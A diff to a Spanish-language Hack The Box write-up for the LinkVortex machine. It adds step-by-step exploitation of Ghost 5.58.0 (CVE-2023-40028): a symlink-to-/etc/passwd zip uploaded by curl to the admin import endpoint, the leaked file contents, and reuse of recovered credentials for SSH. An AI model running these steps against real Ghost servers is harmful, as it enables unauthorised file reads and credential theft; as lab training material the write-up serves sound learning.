@@ -213,7 +213,7 @@ Podemos comprobar que esta expuesto accediendo desde la web
 
 ![](assets/Pasted%20image%2020251225214753.png)
 
-Utilice la herramienta `git-dumper` para reconstruir el repositorio en mi host
+Utilice la herramienta `git-dumper` para reconstruir el repositorio en mi host.
 
 ```bash
 > git-dumper http://dev.linkvortex.htb/.git/ repo
@@ -246,7 +246,10 @@ ENTRYPOINT ["/entry.sh"]
 CMD ["node", "current/index.js"]
 ```
 
-Viendo el historial de commits podemos ver la version `v5.58.0`
+- Ruta de instalación de Ghost `/var/lib/ghost/config.production.json
+- Version de Ghost 5.58.0
+
+Con `git log` vi el historial de commits del repositorio y podemos confirmar la version `v5.58.0` de Ghost.
 
 ```bash
 > git log
@@ -258,7 +261,7 @@ Date:   Fri Aug 4 15:02:54 2023 +0000
 
 ```
 
-Vi los archivos sin commitear del repositorio y me encontré con lo siguiente.
+Con `git status` mire los archivos sin trackear (sin commitear) del repositorio y me encontré con 2 de ellos.
 
 - `authentication.js` y el Dockerfile que ya vimos
 
@@ -273,7 +276,7 @@ Changes to be committed:
 
 Haciéndole un cat podemos ver lo siguiente
 
-- La password `OctopiFociPilfer45` y un usuario `test@example.com`
+- La password `OctopiFociPilfer45` y un usuario `test@example.com`.
 
 ```js
 > cat /ghost/core/test/regression/api/admin/authentication.test.js
@@ -287,11 +290,11 @@ Haciéndole un cat podemos ver lo siguiente
 
 Anteriormente vimos que todos los posts son de un usuario llamado `admin` por lo cual puedo tratar de utilizar este usuario para ver si es valido
 
-- Como vemos a diferencia de la otra solicitud donde el usuario no existía, en esta solo se me indica que la password es incorrecta y no que el usuario no existe, por lo cual admin es un usuario valido.
-
 ![](assets/Pasted%20image%2020251225213952.png)
 
-Por lo cual ahora puedo tratar de reutilizar la password que me encontré en el repositorio.
+- A diferencia de la otra solicitud donde se me indicaba que el usuario no existía, en esta solo se me indica que la password es incorrecta por lo cual admin puede ser un usuario valido.
+
+Por lo cual ahora puedo tratar de reutilizar la credencial que me encontré en el repositorio.
 
 - `admin@linkvortex.htb:OctopiFociPilfer45`
 
@@ -301,18 +304,70 @@ Y entramos al CMS
 
 ![](assets/Pasted%20image%2020251225220839.png)
 
-Podemos verificar la version `5.58.0` que encontramos en el `git log`
-
-![](assets/Pasted%20image%2020251225224302.png)
 
 Dentro del CMS la verdad que no habia nada interesante que me dejara explotar para tener acceso a la maquina. Por lo cual decidí buscar vulnerabilidades para la versions `5.58.0` de Ghost y me encontré con lo siguiente: [CVE-2023-40028](https://nvd.nist.gov/vuln/detail/CVE-2023-40028).
 
-La vulnerabilidad consiste en una lectura de archivos mediante la subida de un zip malicioso que contenga symlinks. Utilizare el siguiente [PoC](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028/tree/master)
+La vulnerabilidad consiste en una lectura de archivos mediante la subida de un zip malicioso que contenga symlinks.
+
+Voy a crear un archivo `.jpg` con un enlace al `/etc/passwd` y lo voy a zipear.
+
+```bash
+> ln -s /etc/passwd payload.jpg
+> ls -la
+total 12
+lrwxrwxrwx 1 wndr wndr   11 Dec 25 23:25 payload.jpg -> /etc/passwd
+
+> zip -y payload.zip payload.jpg
+  adding: payload.jpg (stored 0%)
+```
+
+El endpoint al que le tenemos que mandar el payload es `/ghost/api/admin/db` y necesitamos una cookie la cual podemos sacar desde el navegador una vez estemos autenticados. 
+
+```bash
+> curl http://linkvortex.htb/ghost/api/admin/db -F "importfile=@payload.zip" -b 'ghost-admin-api-session=s%3AvreBN6J4tX3hB72utdPJsUoY5tioSgXs.USiAyUboSh4yLul2mkxJEp4rMztT50M47E0IU0of3j8'
+
+{"db":[],"problems":[]}
+```
+
+- _-F_: significa **form-data** (multipart/form-data), igual que cuando subes un archivo desde un formulario HTML
+- _-b_: Browser Cookies, envía cookies a la petición http, en este casos nuestra cookie de sesion que sacamos del Navegador -> Inspect -> Storage
+
+Una vez que el archivo se envié correctamente podremos acceder a nuestro archivo en la ruta `/content/images`
+
+- Como vemos, al abrir el archivo `.jpg` en realidad se nos muestra el contenido de `/etc/passwd` gracias al symlink.
+
+```bash
+> curl http://linkvortex.htb/content/images/payload.jpg
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+node:x:1000:1000::/home/node:/bin/bash
+```
+
+ El siguiente [PoC](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028/tree/master) hace lo mismo que hicimos pero de manera automatizada
 
 - Ejecute el exploit y leí el archivo de configuración que encontramos en el Dockerfile `/var/lib/ghost/config.production.json`
 
 ```bash
-/CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb/
+> /CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb/
+
 WELCOME TO THE CVE-2023-40028 SHELL
 Enter the file path to read (or type 'exit' to quit): /var/lib/ghost/config.production.json
 File content:
@@ -356,7 +411,7 @@ File content:
 
 - Encuentro las credenciales `bob@linkvortex.htb:fibber-talented-worth`
 
-Ahora utilizo las credenciales para entrar por `SSH`
+Ahora reutilizo las credenciales para tratar de entrar por `SSH`.
 
 ```bash
 ssh bob@10.129.231.194
@@ -392,7 +447,6 @@ Matching Defaults entries for bob on linkvortex:
 User bob may run the following commands on linkvortex:
     (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
 ```
-
 
 - El script recibe como parámetro un archivo `.png` y comprueba si es un enlace simbólico.  Si el symlink apunta a una ruta que contiene `/etc` o `/root`, el enlace es eliminado. En caso contrario, el archivo se mueve a cuarentena y **solo se muestra su contenido si `CHECK_CONTENT=true`** (por defecto está en `false`).
 
